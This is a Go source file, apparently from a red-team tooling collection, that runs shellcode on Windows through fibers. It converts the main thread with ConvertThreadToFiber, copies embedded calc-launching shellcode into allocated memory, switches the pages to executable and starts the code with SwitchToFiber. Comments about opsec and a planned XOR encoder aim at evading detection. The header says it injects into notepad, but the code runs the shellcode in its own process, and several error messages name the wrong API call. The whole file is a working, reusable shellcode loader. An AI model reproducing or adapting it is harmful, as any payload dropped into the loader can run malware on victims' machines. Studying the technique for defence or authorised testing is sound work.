/*
	@saulpanders
	Fiber shellcode injection technique

	currently creates an instance of notepad and injects to pop shellcode for calc

	NOTE: no stable way to exit the shellcode fiber once scheduled (yet) so just Cntrl-C


	METHOD:

			1. ConvertThreadToFiber main thread to a fiber (only fibers can schedule other fibers)
			2. Write shellcode to memory and make it executable (virtualalloc & rtlmovememory)
			3. Create new fiber pointing to shellcode (CreateFiber)
			4. Schedule shellcode fiber to execute (SwitchToFiber)
	TODO:

		XOR encoder for shellcode
		Refactor code to "functions"

	BUILD:

		go build

	Source:
		https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber.md


*/

package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

const (
	PROCESS_CREATE_THREAD     = 0x0080
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_READ           = 0x0010
	PROCESS_VM_WRITE          = 0x0020

	CREATE_THREAD_ACCESS = (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

	MEM_COMMIT  = 0x00001000
	MEM_RESERVE = 0x00002000

	MEM_PERMISSIONS = (MEM_COMMIT | MEM_RESERVE)

	PAGE_READWRITE    = 0x04
	PAGE_EXECUTE_READ = 0x20

	CREATE_NO_WINDOW = 0x08000000

	THREAD_SET_CONTEXT = 0x0010
)

func main() {

	//ARGS

	verbose := flag.Bool("verbose", false, "Enable verbose output")
	flag.Parse()

	//Pop Calc Shellcode - SOLID SHELLCODE POC
	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	CopyMemory := ntdll.NewProc("RtlCopyMemory")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	CreateFiber := kernel32.NewProc("CreateFiber")
	ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
	SwitchToFiber := kernel32.NewProc("SwitchToFiber")
	rw := PAGE_READWRITE

	//Get current thread & convert to a fiber
	current_fiber, _, errConvertThreadToFiber := ConvertThreadToFiber.Call(0)
	if errConvertThreadToFiber != nil && errConvertThreadToFiber.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ConvertThreadToFiber:\r\n%s", errConvertThreadToFiber.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully created fiber from thread at: %p", current_fiber))
	}

	//Allocating memory in process - VirtualAlloc
	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_PERMISSIONS, PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}
	if addr == 0 {
		log.Fatal("[!]VirtualAlloc failed and returned 0")
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory at: %p", addr))
	}

	//Writing shellcode into allocated memory - memcpy
	_, _, errCopyMemory := CopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if errCopyMemory != nil && errCopyMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errCopyMemory.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ at %p", addr))
	}

	//Modifying permissions from RW to RX - VirtualProtect (RWX is bad and not opsec safe)
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&rw)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ at %p", addr))
	}

	shellcode_fiber, _, errCreateFiber := CreateFiber.Call(0, uintptr(addr), 0)
	if errCreateFiber != nil && errCreateFiber.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errCreateFiber.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully converted thread to fiber at %p", addr))
	}

	_, _, errSwitchToFiber := SwitchToFiber.Call(uintptr(shellcode_fiber))
	if errSwitchToFiber != nil && errSwitchToFiber.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errSwitchToFiber.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully switched to shellcode_fiber %p", addr))
	}
}
